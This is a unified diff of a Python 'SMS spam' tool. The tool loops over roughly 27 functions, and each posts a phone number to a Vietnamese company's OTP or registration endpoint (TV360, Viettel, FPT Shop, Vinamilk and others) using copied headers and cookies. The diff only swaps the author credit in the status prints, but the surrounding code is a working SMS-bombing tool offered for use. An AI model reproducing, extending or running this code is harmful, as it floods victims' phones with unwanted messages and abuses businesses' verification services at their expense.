@@ -56,9 +56,9 @@ def tv360(sdt):
 
     response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', headers=headers, json=json_data).json()
     if response ['errorCode'] == 200:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TV360 SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m TV360 SPAM THÀNH CÔNG')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TV360 SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m TV360 SPAM THẤT BẠI')
 def hoangphuc(sdt):
     headers = {
         'authority': 'hoang-phuc.com',
@@ -82,9 +82,9 @@ def hoangphuc(sdt):
     }
     response = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', headers=headers, data=data).json()
     if response ['success'] == True:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m HOÀNG PHÚC SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m HOÀNG PHÚC SPAM THÀNH CÔNG')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m HOÀNG PHÚC SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m HOÀNG PHÚC SPAM THẤT BẠI')
 
 def fmplus(sdt):
     headers = {
@@ -114,9 +114,9 @@ def fmplus(sdt):
     }
     response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data).json()
     if response ['Code'] == 200:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FMPLUS SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m FMPLUS SPAM THÀNH CÔNG')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FMPLUS SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m FMPLUS SPAM THẤT BẠI')
 
 def winmart(sdt):
     headers = {
@@ -146,11 +146,11 @@ def winmart(sdt):
     response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data).json()
     try:
         if response ['code'] == 'S200':
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m WINMART SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m WINMART SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m WINMART SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m WINMART SPAM THẤT BẠI')
 
 def gateway(sdt):
     headers = {
@@ -175,9 +175,9 @@ def gateway(sdt):
 
     response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data).json()
     if response ['code'] == 200:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GHN SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m GHN SPAM THÀNH CÔNG')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GHN SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m GHN SPAM THẤT BẠI')
 def hine(sdt):
     headers = {
         'authority': 'ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com',
@@ -200,9 +200,9 @@ def hine(sdt):
     }
     response = requests.post('https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send', headers=headers, json=json_data,).json()
     if response ['success'] == True:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m 30SHINE SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m 30SHINE SPAM THÀNH CÔNG')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m 30SHINE SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m 30SHINE SPAM THẤT BẠI')
 
 def medicare(sdt):
     headers = {
@@ -228,11 +228,11 @@ def medicare(sdt):
     response = requests.post('https://medicare.vn/api/otp', headers=headers, json=json_data).json()
     try:
         if response ['error_code'] == 'fail':
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m MEDICARE SPAM THẤT BẠI')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m MEDICARE SPAM THÀNH CÔNG')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m MEDICARE SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m MEDICARE SPAM THÀNH CÔNG')
 
 def batdongsan(sdt):
     headers = {
@@ -254,11 +254,11 @@ def batdongsan(sdt):
     response = requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister', params=params, headers=headers,).json()
     try:
         if response ['data'] == 'success':
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m BATDONGSAN SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m BATDONGSAN SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m BATDONGSAN SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m BATDONGSAN SPAM THẤT BẠI')
 
 def tokyolife(sdt):
     headers = {
@@ -286,9 +286,9 @@ def tokyolife(sdt):
     }
     response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data).json()
     if response ['success'] == True:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TOKYOLIFE SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m TOKYOLIFE SPAM THÀNH CÔNG')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TOKYOLIFE SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m TOKYOLIFE SPAM THẤT BẠI')
 
 def futabus(sdt):
     headers = {
@@ -316,9 +316,9 @@ def futabus(sdt):
 
     response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data).json()
     if response ['message'] == 'OK':
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FUTABUS SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m FUTABUS SPAM THÀNH CÔNG')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FUTABUS SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m FUTABUS SPAM THẤT BẠI')
 
 def thegioididong(sdt):
     cookies = {
@@ -372,9 +372,9 @@ def thegioididong(sdt):
     }
     response = requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode', cookies=cookies, headers=headers, data=data,).json()
     if response ['statusCode'] == 200:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TGDĐ SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m TGDĐ SPAM THÀNH CÔNG')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m TGDĐ SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m TGDĐ SPAM THẤT BẠI')
 
 def kingfoodmart(sdt):
     headers = {
@@ -401,9 +401,9 @@ def kingfoodmart(sdt):
     response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data).json()
     data2 = response['data']['sendOtp']
     if data2 == None:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m KINGFOO SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m KINGFOO SPAM THẤT BẠI')
     else:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m KINGFOO SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m KINGFOO SPAM THÀNH CÔNG')
 
 def lottemart(sdt): # API lottemart CALL
     headers = {
@@ -428,11 +428,11 @@ def lottemart(sdt): # API lottemart CALL
     response = requests.post('https://www.lottemart.vn/v1/p/mart/bos/vi_cto/V1/mart-sms/sendotp', headers=headers, json=json_data).json()
     try:
         if response ['error'] == '':
-            print("[BY: REVIEWTOOL] ~ \033[1;35m LOTTEMART SPAM THÀNH CÔNG")
+            print("[BY: La Minh Lợi ] ~ \033[1;35m LOTTEMART SPAM THÀNH CÔNG")
         else:
-            print("[BY: REVIEWTOOL] ~ \033[1;35m LOTTEMART SPAM THẤT BẠI")
+            print("[BY: La Minh Lợi ] ~ \033[1;35m LOTTEMART SPAM THẤT BẠI")
     except:
-        print("[BY: REVIEWTOOL] ~ \033[1;35m LOTTEMART SPAM THẤT BẠI")
+        print("[BY: La Minh Lợi ] ~ \033[1;35m LOTTEMART SPAM THẤT BẠI")
 
 def dienmayxanh(sdt):
     cookies = {
@@ -488,9 +488,9 @@ def dienmayxanh(sdt):
     response = requests.post('https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode', cookies=cookies, headers=headers, data=data).json()
     # print(response)
     if response ['statusCode'] == 200:
-        print("[BY: REVIEWTOOL] ~ \033[1;35m ĐMX SPAM THÀNH CÔNG")
+        print("[BY: La Minh Lợi ] ~ \033[1;35m ĐMX SPAM THÀNH CÔNG")
     else:
-        print("[BY: REVIEWTOOL] ~ \033[1;35m ĐMX SPAM THẤT BẠI")
+        print("[BY: La Minh Lợi ] ~ \033[1;35m ĐMX SPAM THẤT BẠI")
 # \\ Vui lòng tôn trọng tác giả không xóa//
 # /* Copyright © 27/07/2024 : Developer Chí Mum */
 def reebok(sdt):
@@ -518,11 +518,11 @@ def reebok(sdt):
     # print(response)
     try:
         if response ['statusCode'] == 400:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m REEBOK SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m REEBOK SPAM THẤT BẠI')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m REEBOK SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m REEBOK SPAM THÀNH CÔNG')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m REEBOK SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m REEBOK SPAM THÀNH CÔNG')
 
 def glxplay(sdt):
     headers = {
@@ -547,11 +547,11 @@ def glxplay(sdt):
     response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers).json()
     try:
         if response ['statusCode'] == 400:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m GALAXY SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m GALAXY SPAM THẤT BẠI')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m GALAXY SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m GALAXY SPAM THÀNH CÔNG')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GALAXY SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m GALAXY SPAM THÀNH CÔNG')
 
 def fahasa(sdt):
     headers = {
@@ -577,11 +577,11 @@ def fahasa(sdt):
     response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', headers=headers, data=data).json()
     try:
         if response ['success'] == True:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m FAHASA SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m FAHASA SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m FAHASA SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m FAHASA SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FAHASA SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m FAHASA SPAM THẤT BẠI')
 
 def nhathuoclongchau(sdt):
     headers = {
@@ -611,11 +611,11 @@ def nhathuoclongchau(sdt):
     try:
         chi_mum = response['error']['details']
         if chi_mum == None:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m NTLC SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m NTLC SPAM THẤT BẠI')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m NTLC SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m NTLC SPAM THÀNH CÔNG')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m NTLC SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m NTLC SPAM THÀNH CÔNG')
 
 def fptshop(sdt):
     headers = {
@@ -644,11 +644,11 @@ def fptshop(sdt):
     try:
         chi_mum = response['error']['details']
         if chi_mum == None:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m FPTSHOP SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m FPTSHOP SPAM THẤT BẠI')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m FPTSHOP SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m FPTSHOP SPAM THÀNH CÔNG')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m FPTSHOP SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m FPTSHOP SPAM THÀNH CÔNG')
 
 def gumac(sdt):
     headers = {
@@ -673,11 +673,11 @@ def gumac(sdt):
     try:
         data_cm = response['data']['otp']
         if data_cm == '':
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m GUMAC SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m GUMAC SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m GUMAC SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m GUMAC SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m GUMAC SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m GUMAC SPAM THẤT BẠI')
 
 def vietloan(sdt):
     cookies = {
@@ -737,11 +737,11 @@ def vietloan(sdt):
     response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data).json()
     try:
         if response ['status'] == 'success':
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETLOAN SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETLOAN SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETLOAN SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETLOAN SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETLOAN SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETLOAN SPAM THẤT BẠI')
 
 def viettel(sdt):
     cookies = {
@@ -774,11 +774,11 @@ def viettel(sdt):
     response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data).json()
     try:
         if response ['errorCode'] == 0:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETTEL SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETTEL SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETTEL SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETTEL SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETTEL SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETTEL SPAM THẤT BẠI')
 
 def best(sdt):
     headers = {
@@ -809,11 +809,11 @@ def best(sdt):
     response = requests.post('https://v9-cc.800best.com/uc/account/sendsignupcode', headers=headers, json=json_data).json()
     try:
         if response ['success'] == True:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BEST-INC SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m BEST-INC SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m BEST-INC SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m BEST-INC SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m BEST-INC SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m BEST-INC SPAM THẤT BẠI')
 
 def emartmall(sdt):
     headers = {
@@ -837,11 +837,11 @@ def emartmall(sdt):
     response = requests.post('https://emartmall.com.vn/index.php?route=account/register/smsRegister', headers=headers, data=data).json()
     try:
         if response ['result'] == 'success':
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m EMARTMALL SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m EMARTMALL SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m EMARTMALL SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m EMARTMALL SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL ~ \033[1;35m EMARTMALL SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi  ~ \033[1;35m EMARTMALL SPAM THẤT BẠI')
 
 def mutosi(sdt):
     headers = {
@@ -870,11 +870,11 @@ def mutosi(sdt):
     response = requests.post('https://api-omni.mutosi.com/client/auth/reset-password/send-phone', headers=headers, json=json_data).json()
     try:
         if response ['status'] == 'error':
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MUTOSI SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m MUTOSI SPAM THẤT BẠI')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m MUTOSI SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m MUTOSI SPAM THÀNH CÔNG')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m MUTOSI SPAM THÀNH CÔNG')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m MUTOSI SPAM THÀNH CÔNG')
 # \\ Vui lòng tôn trọng tác giả không xóa//
 # /* Copyright © 27/07/2024 : Văn Tuân */
 def vinamilk(sdt):
@@ -917,7 +917,7 @@ def vinamilk(sdt):
     }
     data = '{"type":"register","phone":"' + sdt + '"}'
     response = requests.post('https://new.vinamilk.com.vn/api/account/getotp', cookies=cookies, headers=headers, data=data)
-    print(f'[BY: REVIEWTOOL] ~ \033[1;35m VINAMILK SPAM THÀNH CÔNG')
+    print(f'[BY: La Minh Lợi ] ~ \033[1;35m VINAMILK SPAM THÀNH CÔNG')
 
 def vietair(sdt):
     referer_url = f'https://vietair.com.vn/khach-hang-than-quen/xac-nhan-otp-dang-ky?sq_id=30149&mobile={sdt}'
@@ -961,11 +961,11 @@ def vietair(sdt):
     response = requests.post('https://vietair.com.vn/Handler/CoreHandler.ashx', cookies=cookies, headers=headers, data=data).json()
     try:
         if response ['TypeMsg'] == 1:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETAIR SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETAIR SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETAIR SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETAIR SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m VIETAIR SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m VIETAIR SPAM THẤT BẠI')
 
 def sapo(sdt):
     cookies = {
@@ -1025,11 +1025,11 @@ def sapo(sdt):
     response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data).json()
     try:
         if response == True:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m SAPO SPAM THÀNH CÔNG')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m SAPO SPAM THÀNH CÔNG')
         else:
-            print(f'[BY: REVIEWTOOL] ~ \033[1;35m SAPO SPAM THẤT BẠI')
+            print(f'[BY: La Minh Lợi ] ~ \033[1;35m SAPO SPAM THẤT BẠI')
     except:
-        print(f'[BY: REVIEWTOOL] ~ \033[1;35m SAPO SPAM THẤT BẠI')
+        print(f'[BY: La Minh Lợi ] ~ \033[1;35m SAPO SPAM THẤT BẠI')
 
 # GỌI HÀM ĐỂ HOẠT ĐỘNG CODE !
 # \\\ TOOL SPAM SMS 27 API ///
